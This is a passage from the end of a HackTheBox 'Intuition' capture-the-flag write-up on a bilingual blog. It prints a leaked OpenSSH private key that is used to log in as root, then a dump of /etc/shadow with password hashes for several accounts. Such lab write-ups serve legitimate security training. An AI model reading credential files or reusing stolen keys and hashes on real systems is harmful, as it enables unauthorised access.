class="line">r6BoZJLH2IbAkoLq9141wEMIpUpSXAPWNVMT/UEMVkTK80F4Mi57XlKCFw9VDpthbisH5I</span><br><span class="line">NoJRrjpizXAwiEBto4YBYA24F0W+WJ3axTweQIv2cAwTJI81S8lLxHCFeZZtK8kxfc0krc</span><br><span class="line">/TmVucauoS8kUaIYuYoI7Bio6Qh1OLgGzYZWZ46ciKXaCvwYkAoWgTwmXQX0u5qiUodS3k</span><br><span class="line">auRe4i7tXGcUpzm/yQQJTqbXRBbhmuUcXsKBi0fsdJHQiAsIFrqYt3CMoUaIZg07aWr3xA</span><br><span class="line">1oBBk2I+ubqayNqrlOo9Y8ICX2RvYD4fM1mr9830pQ5myvfL7x3j3zL6sHUalUYF83HD6n</span><br><span class="line">cCKVNmKq5OvEy9BvDuEJ1AJKlqvarQAAAAMBAAEAAAGAAYw2Cry5l4IzH4zm9/yYIp0zRO</span><br><span class="line">bqwLik55neMhLigHP8hKrmqm/FWgI/Xx+RFGxTxiUDlod9M0pEGWvLX6hBKT55G+1xstbv</span><br><span class="line">hmbZM2rhRsWl7Gw70GaQ5aXFCGqLeS2Ob80LE69VgSSPgOoEqRrcmO6TELDoILcSZRwVDg</span><br><span class="line">FQGQbnLbx4Tq7oi2Y42UDqXf6quRxX4TmTasPrjX+RGEkNIW25gcVH50x7XfCLJS7bDzYd</span><br><span class="line">6HwaJ6OqhdgR4C/PStV7v6DfgjD92/m/8S+72vbiZypVy/uXTVe4qDko1DhYqI2Mcb4uxw</span><br><span class="line">9veijKtY3Z413ZnGKLmcjuzjayzuUQQrkluLZMJvg7+BsHiiXcjzQKPvQ5HN8LGhjdnGWO</span><br><span class="line">mMdG1/4rXhkJENamyWisdkKTv61BXFEbCGSZpbJuADdvdLS0hdBVhLLnlHjvG416CxcB5K</span><br><span class="line">by0hKhsMOJ2VbBKuLTaVvTWCDZThdS2pjWlEZZzfV1hFwuG7PlFWJ8D0zdEOycKmeFAAAA</span><br><span class="line">wQDBLlZKQIJKHWPyN2LiftWRyeFAzG/+xeq/u4eEFzM0QliKuWIgzm8th/LsPBn7wsiQvz</span><br><span class="line">Mktc6q4iD+9dlNyHUNk8Kh1Bxd0188if7cR/0XxlNfbVmc7lXxySjPgjkLRn3ZxVxErYCK</span><br><span class="line">7w/Sq9SO42sT9U0BsCD4+zeDzbpJmWY27+cvV6UpJsKAbzFwOgapqUCANfdgyv/d24CqA5</span><br><span class="line">6IY3yS2RTYZf/fo87EGWBFbgjUAc0GErBF7C2HuZYgJGuRG0sAAADBAOQGD/i7EXaJazmI</span><br><span class="line">GQtrgYigKkR4b+JODNv5iVOkbP8Q+JaN3ytlWvzOTmga8vkDhcdBbVptKzqNO/3Dq09Tmu</span><br><span class="line">W5/lVjZ7aorksK7G0hvBDVEkagiXiWk/ChNwK+yEp1yL0XRsJ+ElgRBpmxxeBrWvOY+jsv</span><br><span class="line">kJDsNA5dOG+SR5nrDXN01IkkfloIuMZPhBuSn/WCvmjOynca+MA00q9gkKAvkXHRV5kzYO</span><br><span class="line">TbTuKlU7hAS0cgOY/p/MTve7JHaw8CAwAAAMEAt5KdT+e7Act1pX2c3sm/NvZaYIaVQlLA</span><br><span class="line">qNGxASDhNox9SQsr0Pl9lJyhSV5zpOReDMpaBXO5f6dpE/aefk/sXD3gRjDgiXbCztatkR</span><br><span class="line">Ta4WcbDBmTxK+RGFCm2qMkIlMIKUtqDaRyIhlrrHhcMDAmGdrT0A3KRHb8NSxqq221OGLJ</span><br><span class="line">aorfYLBcILL73QKCBg9R2x+BSP8shGTZJ98sxTlUXbZISfXrgX+9F6jhtORouWXeDx0GYA</span><br><span class="line">/SyH9wMrVGJ+mPAAAACnJvb3RAbG9jYWw=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>於是就可以愉快的登陸了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429173539-2xtu19d.png" alt="image">​</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@intuition:~<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$uiniFHjBFerbO</span>..eAx7bI1<span class="variable">$A6O8Lt6NG3BS33humdTtnyFe3uTcM3Gew1gldp0S2r4</span>:19656:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19589:0:99999:7:::</span><br><span class="line">lxd:!:19589::::::</span><br><span class="line">dnsmasq:*:19595:0:99999:7:::</span><br><span class="line">avahi:*:19605:0:99999:7:::</span><br><span class="line">geoclue:*:19605:0:99999:7:::</span><br><span class="line">adam:$y$j9T<span class="variable">$RxWDBIbgNBK</span>.1OPH6yR6q0<span class="variable">$SkHyQ3QsKfTQ</span>/igOVFsA5pCyosQdsfOkdN2uFL9rJA9:19656:0:99999:7:::</span><br><span class="line">dev_acc:$y$j9T<span class="variable">$lLBxGx6iEU24F53iC</span>/4GY.<span class="variable">$njJxClEhidCwWmF9yQjsSChxZ38hN3fhU7N4YOPovt4</span>:19838:0:99999:7:::</span><br><span class="line">lopez:$y$j9T<span class="variable">$iuv2R99Ps</span>/.rTY6fkdya/1<span class="variable">$gk87UA</span>.ESt6ObAMJVEkH9oxsy3Qui570dUn4NloxqEC:19643:0:99999:7:::</span><br><span class="line">_laurel:!:19822::::::</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#109;&#97;&#110;&#x65;&#x40;&#109;&#97;&#x6e;&#x65;&#115;&#x65;&#99;&#x2e;&#99;&#x6f;&#x6d;">&#109;&#97;&#110;&#x65;&#x40;&#109;&#97;&#x6e;&#x65;&#115;&#x65;&#99;&#x2e;&#99;&#x6f;&#x6d;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#x6d;&#x61;&#110;&#x65;&#64;&#x6d;&#x61;&#x6e;&#x65;&#115;&#x65;&#x63;&#x2e;&#x63;&#x6f;&#109;">&#x6d;&#x61;&#110;&#x65;&#64;&#x6d;&#x61;&#x6e;&#x65;&#115;&#x65;&#x63;&#x2e;&#x63;&#x6f;&#109;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&text=HackTheBox - Machine - Intuition"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&is_video=false&description=HackTheBox - Machine - Intuition"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Intuition&body=Check out this article: https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&name=HackTheBox - Machine - Intuition&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&t=HackTheBox - Machine - Intuition"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
